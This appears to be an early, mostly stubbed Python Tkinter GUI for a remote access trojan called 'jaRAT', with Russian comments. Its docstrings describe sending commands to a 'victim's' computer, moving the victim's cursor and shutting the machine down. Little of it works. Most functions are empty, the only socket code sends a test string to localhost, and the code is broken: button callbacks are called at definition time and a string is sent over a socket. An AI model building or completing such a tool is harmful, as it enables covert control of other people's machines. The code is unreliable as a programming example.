# импрорты
from tkinter import *
import socket

sock = socket.socket()
# цвета
colors = {
    'black_blue': (0, 0, 51),
    'white': (255, 255, 255),
    'soft_green': (51, 153, 102),
    'aggressive_red': (51, 153, 102),
    'soft_blue': (0, 107, 179)
}


def send_command():
    """
    берёт данные из поля ввода и отправляет их как команду комьютеру жертвы
    :return: возвращает True в случае успеха возвращает False при ошибке отправки данных
    """
    pass


def kursor():
    """
    переносит курсор в левый верхний угол экрана
    :return: возвращает True в случае успеха возвращает False при ошибке отправки данных
    """
    pass


def turn_off():
    """
    выключает компьютер
    :return: возвращает True в случае отправки данных
    :return: возвращает False при ошибке отправки данных
    """
    sock.send('hello, world!')

    data = sock.recv(1024)
    sock.close()

    print(data)


def connect():
    sock.connect(('localhost', 9090))


window = Tk()
window.title("меню jaRAT")
window.configure(background='BLACK')
lbl = Label(window, text="Поддадим-ка мы жарку", font=("Arial", 50), fg='WHiTE', bg='BLACK')
lbl.grid(column=0, row=0)
txt = Entry(window, width=10, font=("Arial", 30))
txt.grid(column=0, row=1)
btn = Button(window, text="отправить команду(cmd)", fg='WHiTE', bg='BLACK', font=("Arial", 30), command=send_command)
btn.grid(column=1, row=1)
btn = Button(window, text="переместить курсор в шабаны", fg='WHiTE', bg='BLACK', font=("Arial", 30), command=kursor)
btn.grid(column=0, row=2)
btn = Button(window, text="вырубить комп", fg='WHiTE', bg='BLACK', font=("Arial", 30), command=turn_off())
btn.grid(column=1, row=2)
btn = Button(window, text="Подключиться", fg='WHiTE', bg='BLACK', font=("Arial", 30), command=connect())
btn.grid(column=1, row=2)

window.mainloop()
